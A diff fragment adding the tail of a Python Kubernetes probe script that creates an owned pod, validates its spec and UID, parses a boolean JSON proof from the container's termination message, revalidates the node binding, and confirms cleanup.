+                      return result
+                  result["owned_pod_created"] = True
+                  child_uid = created["metadata"]["uid"]
+                  result["actual_spec_preserved"] = admitted_spec_preserved(created, expected)
+                  if not result["actual_spec_preserved"]:
+                      return result
+                  result["pod_reached_terminal"] = client.wait_terminal(child_uid)
+                  if not result["pod_reached_terminal"]:
+                      return result
+                  # The terminal message is returned atomically with the exact Pod UID.
+                  # The name-only pods/log endpoint is intentionally not permitted.
+                  current = client.get_child()
+                  if current is None or not ownership_matches(current, expected) or current["metadata"]["uid"] != child_uid:
+                      return result
+                  states = current.get("status", {}).get("containerStatuses", [])
+                  if len(states) != 1 or states[0].get("name") != "probe":
+                      return result
+                  terminal = states[0].get("state", {}).get("terminated", {})
+                  raw = terminal.get("message", "")
+                  if terminal.get("exitCode") != 1 or not isinstance(raw, str) or len(raw) > MAX_LOG:
+                      return result
+                  proof = json.loads(raw)
+                  if set(proof) != INNER_KEYS or not all(type(value) is bool for value in proof.values()):
+                      return result
+                  again = validate_own_pod(client.json("GET", client.own_path)[1], runner_name, name)
+                  fresh_node = validate_node(client.json("GET", client.node_path)[1], again, family)
+                  revalidate_binding(again, own, fresh_node, binding)
+                  result["own_binding_revalidated"] = True
+                  result.update({"host_" + key: value for key, value in proof.items()})
+                  result["proof_accepted"] = True
+              except Exception:
+                  result["probe_error"] = True
+              finally:
+                  if client is not None:
+                      result["pod_create_attempted"] = client.create_attempted
+                      if client.create_attempted and expected is not None and not conflict:
+                          try:
+                              result["cleanup_confirmed"] = client.cleanup(expected)
+                          except Exception:
+                              result["probe_error"] = True
+                      result["unresolved_create_outcome"] = client.create_attempted and client.created_uid is None and not conflict
+                      result["unknown_create_name_absent"] = client.unknown_create_absent
+                      if client.create_attempted and not result["cleanup_confirmed"]:
+                          result["cleanup_failed"] = True
+                          result["probe_error"] = True
+              return result
+
+
+          if __name__ == "__main__":
+              result = main()
+              print(json.dumps(result, sort_keys=True))
+              raise SystemExit(0 if result["proof_accepted"] and result["cleanup_confirmed"] else 1)
+          PY
